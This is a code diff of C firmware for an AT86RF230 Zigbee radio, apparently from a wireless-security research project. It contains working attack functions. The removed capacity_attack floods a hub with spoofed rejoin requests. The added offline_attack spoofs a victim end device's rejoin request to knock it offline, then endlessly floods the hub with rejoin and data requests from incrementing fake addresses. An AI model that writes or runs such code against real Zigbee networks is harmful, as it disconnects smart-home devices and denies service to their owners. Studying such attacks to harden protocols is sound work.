@@ -18,6 +18,7 @@ uint16_t FCF = 0;
 unsigned char seqno = 0;
 unsigned char cmd = 0;
 /********  Transciver Library ********/
+
 /**
  * @brief  set_rx_aack: Set the required registers used for RX_AACK mode, then transfer the state to RX_AACK
  * @note   
@@ -88,6 +89,8 @@ void send_zbee_cmd(uint8_t command, uint8_t security,
 				   ieee802154_addr* dst_addr, ieee802154_addr* src_addr,
 				   rx_aack_config* aack_config)
 {
+	led(1);
+	DELAY_1;
 	uint8_t reg_status = 0;
 	// 1: Change Transciver state to TRX_CMD_FORCE_PLL_ON
 	change_state(TRX_CMD_FORCE_PLL_ON);
@@ -99,7 +102,7 @@ void send_zbee_cmd(uint8_t command, uint8_t security,
 	spi_send(AT86RF230_BUF_WRITE);
 	// Finally we applied hard-coded methods.
 	switch (command) {
-		case ZBEE_MAC_CMD_DATA_RQ :
+		case ZBEE_MAC_CMD_DATA_RQ:
 			send_data_request(security, dst_addr, src_addr);
 			break;
 		case ZBEE_NWK_CMD_REJOIN_RQ :
@@ -128,6 +131,8 @@ void send_zbee_cmd(uint8_t command, uint8_t security,
 		change_state(TRX_CMD_RX_ON);
 		// change_state(TRX_CMD_PLL_ON);
 	}
+	led(0);
+	DELAY_1;
 }
 
 static uint8_t spi_send_blocks(void *data, uint8_t size)
@@ -141,10 +146,11 @@ static uint8_t spi_send_blocks(void *data, uint8_t size)
 	assert(byte_count == size);
 	return byte_count;
 }
+
 /********  END of Transciver Library *******/
 
 /********  Command Library *******/
-// NWK Layer Command
+
 void send_data_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
 {
 	count = 0;
@@ -163,6 +169,7 @@ void send_data_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_a
 
 	assert(count == length - 1);
 }
+
 // NWK Layer Command
 void send_rejoin_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
 {
@@ -212,11 +219,14 @@ void send_rejoin_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154
 	assert(count == length - 1);
 
 }
+
+
 /********  END of Command Library *******/
+
 /********  Attack-Specific Functions *******/
-uint8_t offline_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
+uint8_t capacity_attack(ieee802154_addr* hub_addr, uint64_t random_addr, uint8_t type)
 {
-	// Please check attack_13.c
+	// Please check attack_12.c
 	return 0;
 }
 uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
@@ -224,59 +234,58 @@ uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr
 	// Please check attac_14.c
 	return 0;
 }
-/**
- * @brief  Implement the first attack: Capacity Attack
- * @note   
- * @param  dst_addr:  The target hub's information.
- * @param  random_addr
- * @param  type: type = 2; ZED;	type = 1: ZR; type = 0: ZC
- * @retval 1 if succeed; 0 if the number of sent TC rejoin request exceeds the bound.
- */
-uint8_t capacity_attack(ieee802154_addr* dst_addr, uint64_t random_addr, uint8_t type)
+uint8_t offline_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
 {
-	int32_t trial_count = 0;
-	ieee802154_addr ghost_addr = *dst_addr;
-	ghost_addr.short_addr  = 0x1234;
-	ghost_addr.long_addr = random_addr;
-	ghost_addr.device_type = type;
-	ghost_addr.rx_when_idle = 1;
-	if (type == 2)
-	{
-		// Pretend to be Sleepy End Device
-		ghost_addr.rx_when_idle = 0;
-	}
+	/** 1. Trigger ZED to leave and rejoin. **/
 	rx_aack_config aack_config = {};
-	aack_config.aack_flag = 1;
+	aack_config.aack_flag = 0;
 	aack_config.dis_ack = 0;
 	aack_config.pending = 0;
-	aack_config.target_short_addr.addr = ghost_addr.short_addr;
-	aack_config.target_pan_id.addr = ghost_addr.pan;
-	// The rejoin_full_flag is modified in processing_incoming_packets()
-	while(!rejoin_full_flag)
+	aack_config.target_short_addr.addr = victim_addr->short_addr;
+	aack_config.target_pan_id.addr = victim_addr->pan;
+
+	// Here we change the vicim rx type.
+	victim_addr->rx_when_idle = 1;
+	if (victim_addr->device_type == 1)
 	{
-		led(1);
-		DELAY_1;
-		send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, dst_addr, &ghost_addr, &aack_config);
-		if (type == 2)
+		// TODO: Implement the Offline Attack logic for ZR
+		// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, victim_addr, &aack_config);
+	}
+	else if (victim_addr->device_type == 2)
+	{
+		if (victim_addr->polling_type == 2)
 		{
-			// Send Data Request
-			_delay_us(100);
-			send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, dst_addr, &ghost_addr, &aack_config);
+			send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, victim_addr, &aack_config);
 		}
-		// Delay for a preiod
-		_delay_ms(REJOIN_REQUEST_INTERVAL);
-		trial_count += 1;
-		// Update the MAC address by adding 1.
+		else if (victim_addr->polling_type == 1)
+		{
+			// TODO: How do we deal with ZED with low polling rate, e.g., Dimmer Switch?
+		}
+	}
+	/** 2. Launch capacity attack again **/
+	// Here we need to delay 1 second to wait for multiple Rejoin response finished.
+	_delay_us(500);
+	
+	ieee802154_addr ghost_addr = *victim_addr;
+	ghost_addr.short_addr = 0x1234;
+	ghost_addr.long_addr = random_addr;
+	aack_config.aack_flag = 1;
+	aack_config.target_short_addr.addr = ghost_addr.short_addr;
+	while (1)
+	{
 		ghost_addr.long_addr += 1;
 		ghost_addr.short_addr += 1;
 		aack_config.target_short_addr.addr = ghost_addr.short_addr;
-		// If too many trials have been done, then stop the capacility attack.
-		if (trial_count >= MAX_REJOIN_REQUEST_NUM) {
-			return 0;
+		send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, &ghost_addr, &aack_config);
+		if (ghost_addr.rx_when_idle == 0)
+		{
+			_delay_us(100);
+			send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, hub_addr, &ghost_addr, &aack_config);
 		}
-		led(0);
-		DELAY_1;
+		_delay_ms(REJOIN_REQUEST_INTERVAL);
+
 	}
+	
 	return 1;
 }
 
